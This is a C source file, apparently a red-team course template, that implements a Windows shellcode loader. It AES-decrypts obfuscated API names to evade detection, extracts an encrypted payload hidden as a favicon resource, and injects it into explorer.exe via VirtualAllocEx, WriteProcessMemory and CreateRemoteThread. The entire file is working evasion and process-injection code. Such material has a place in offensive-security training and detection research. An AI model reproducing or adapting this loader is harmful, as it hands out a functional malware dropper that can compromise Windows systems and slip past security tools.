/*

 Red Team Operator course code template
 storing payload in .rsrc section
 
 author: reenz0h (twitter: @sektor7net)

*/
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>
#include <wincrypt.h>
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")
#include <psapi.h>
#include "resources.h"



char key[] =  { 0xc, 0x24, 0xf7, 0xe5, 0x87, 0x96, 0x66, 0x79, 0xbc, 0xcd, 0xa4, 0x81, 0xd, 0x3f, 0x7, 0x19 };

LPVOID (WINAPI* pVAEX)(HANDLE hProcess,LPVOID lpAddress,SIZE_T dwSize,DWORD  flAllocationType,DWORD  flProtect);
BOOL (WINAPI* pWPM)(HANDLE hProcess,LPVOID lpBaseAddress,LPCVOID lpBuffer,SIZE_T nSize,SIZE_T *lpNumberOfBytesWritten);
HANDLE (WINAPI* pCRT)(HANDLE hProcess,LPSECURITY_ATTRIBUTES lpThreadAttributes,SIZE_T dwStackSize,LPTHREAD_START_ROUTINE lpStartAddress,LPVOID lpParameter,DWORD dwCreationFlags,LPDWORD lpThreadId);
BOOL (WINAPI* pVP)(LPVOID lpAddress,SIZE_T dwSize,DWORD  flNewProtect,PDWORD lpflOldProtect);
LPVOID (WINAPI* pVA)(LPVOID lpAddress,SIZE_T dwSize,DWORD  flAllocationType,DWORD  flProtect);


int alterstate(char * payload, unsigned int payload_len, char * key, size_t keylen) {
        HCRYPTPROV hProv;
        HCRYPTHASH hHash;
        HCRYPTKEY hKey;

        if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)){
                return -1;
        }
        if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)){
                return -1;
        }
        if (!CryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0)){
                return -1;              
        }
        if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0,&hKey)){
                return -1;
        }
        
        if (!CryptDecrypt(hKey, (HCRYPTHASH) NULL, 0, 0, payload, &payload_len)){
                return -1;
        }
        
        CryptReleaseContext(hProv, 0);
        CryptDestroyHash(hHash);
        CryptDestroyKey(hKey);
        
        return 0;
}


unsigned char sVAEX[] = { 0x7b, 0x43, 0xd0, 0x6c, 0x3a, 0x33, 0x6f, 0xa3, 0xc7, 0x4c, 0x78, 0x8a, 0xe4, 0x21, 0xcc, 0x6a };
unsigned char sVP[] = { 0x79, 0xff, 0xfb, 0x7, 0xc6, 0x63, 0x4, 0xaf, 0x45, 0xf0, 0x4f, 0x4f, 0x4f, 0xbd, 0xcd, 0xa8 };
unsigned char sWPM[] ={ 0xc3, 0xf7, 0x79, 0x11, 0x81, 0xa5, 0x2, 0xac, 0x73, 0xaf, 0xb2, 0xea, 0xd3, 0x19, 0xd0, 0x41, 0xf9, 0x27, 0x42, 0xe4, 0x2c, 0x98, 0x2f, 0x82, 0x46, 0x37, 0x5f, 0xcc, 0x4f, 0xfd, 0x2f, 0x3 }; 
unsigned char sCRT[] = { 0xc3, 0x8d, 0x2f, 0xdf, 0xf5, 0x87, 0x41, 0x3c, 0xa, 0xcc, 0x64, 0x5f, 0xdc, 0x38, 0x52, 0x5a, 0xe, 0xa3, 0x14, 0x1f, 0xaa, 0xd7, 0xa4, 0xa8, 0x38, 0xb3, 0xfe, 0x9b, 0xa5, 0xe1, 0x54, 0x82 };
unsigned char kern[] = { 0x79, 0x7a, 0xfb, 0xa0, 0x45, 0x6f, 0xe4, 0x55, 0xf3, 0xa8, 0x3f, 0xa, 0x15, 0x93, 0x65, 0x5b };
unsigned char sVA[] = { 0xef, 0xf4, 0xdb, 0x1, 0xb5, 0x79, 0x1d, 0x47, 0x38, 0x4b, 0xba, 0x4e, 0x5d, 0xdb, 0xa0, 0x25 };


int FindTarget(const char *procname) {

        HANDLE hProcSnap;
        PROCESSENTRY32 pe32;
        int pid = 0;
                
        hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (INVALID_HANDLE_VALUE == hProcSnap) return 0;
                
        pe32.dwSize = sizeof(PROCESSENTRY32); 
                
        if (!Process32First(hProcSnap, &pe32)) {
                CloseHandle(hProcSnap);
                return 0;
        }
                
        while (Process32Next(hProcSnap, &pe32)) {
                if (lstrcmpiA(procname, pe32.szExeFile) == 0) {
                        pid = pe32.th32ProcessID;
                        break;
                }
        }
                
        CloseHandle(hProcSnap);
                
        return pid;
}


int intoproc(HANDLE hProc, unsigned char * payload, unsigned int payload_len) {

        LPVOID pRemoteCode = NULL;
        HANDLE hThread = NULL;
			
		pRemoteCode = pVAEX(hProc, NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READ);
        pWPM(hProc, pRemoteCode, (PVOID)payload, (SIZE_T)payload_len, (SIZE_T *)NULL);
        hThread = pCRT(hProc, NULL, 0, pRemoteCode, NULL, 0, NULL);
        if (hThread != NULL) {
                WaitForSingleObject(hThread, 500);
                CloseHandle(hThread);
                return 0;
        }
        return -1;
}


//int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, 
  //  LPSTR lpCmdLine, int nCmdShow) {
int main(){
	void * exec_mem;
	BOOL rv;
	HANDLE th;
    DWORD oldprotect = 0;
	HGLOBAL resHandle = NULL;
	HRSRC res;
	
	unsigned char * payload;
	unsigned int payload_len;
		

	alterstate((char *) sVAEX, sizeof(sVAEX), key, sizeof(key));
	alterstate((char *) sVA, sizeof(sVA), key, sizeof(key));
	alterstate((char *) sVP, sizeof(sVP), key, sizeof(key));
	alterstate((char *) sWPM, sizeof(sWPM), key, sizeof(key));
	alterstate((char *) sCRT, sizeof(sCRT), key, sizeof(key));
	alterstate((char *) kern, sizeof(kern), key, sizeof(key));		
	sVP[14] = '\0';
	kern[12]='\0';
	sVA[12]='\0';
	sVAEX[14]='\0';
	sCRT[18]='\0';
	sWPM[18]='\0';
	
	printf("%s \n",sVAEX);
	printf("%s \n",sVA);
	printf("%s \n",sVP);
	printf("%s \n",sWPM);
	printf("%s \n",sCRT);
	printf("%s \n",kern);

	pVAEX = GetProcAddress(GetModuleHandle(kern),sVAEX);
	pVA = GetProcAddress(GetModuleHandle(kern),sVA);
	pVP = GetProcAddress(GetModuleHandle(kern),sVP);
	pWPM = GetProcAddress(GetModuleHandle(kern),sWPM);
	pCRT = GetProcAddress(GetModuleHandle(kern),sCRT);
	
	
	// Extract payload from resources section
	res = FindResource(NULL, MAKEINTRESOURCE(FAVICON_ICO), RT_RCDATA);
	resHandle = LoadResource(NULL, res);
	payload = (char *) LockResource(resHandle);
	payload_len = SizeofResource(NULL, res);
		
	// Allocate some memory buffer for payload
	exec_mem = pVA(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	// printf("%-20s : 0x%-016p\n", "payload addr", (void *)payload);
	// printf("%-20s : 0x%-016p\n", "exec_mem addr", (void *)exec_mem);

	// Copy payload to new memory buffer
	RtlMoveMemory(exec_mem, payload, payload_len);
	
	alterstate((char *) exec_mem, payload_len, key, sizeof(key));
	// Make the buffer executable
	rv = pVP(exec_mem, payload_len, PAGE_EXECUTE_READ, &oldprotect);

	// printf("\nHit me!\n");
	// getchar();

	int pid = 0;
    HANDLE hProc = NULL;

	pid = FindTarget("explorer.exe");

	if (pid) {
		printf("Notepad.exe PID = %d\n", pid);

		// try to open target process
		hProc = OpenProcess( PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | 
						PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
						FALSE, (DWORD) pid);
		
		printf("hproc = %x!\n",hProc);
		
		if (hProc != NULL) {
			intoproc(hProc, exec_mem, payload_len);
			CloseHandle(hProc);
		}
	}

	return 0;
}
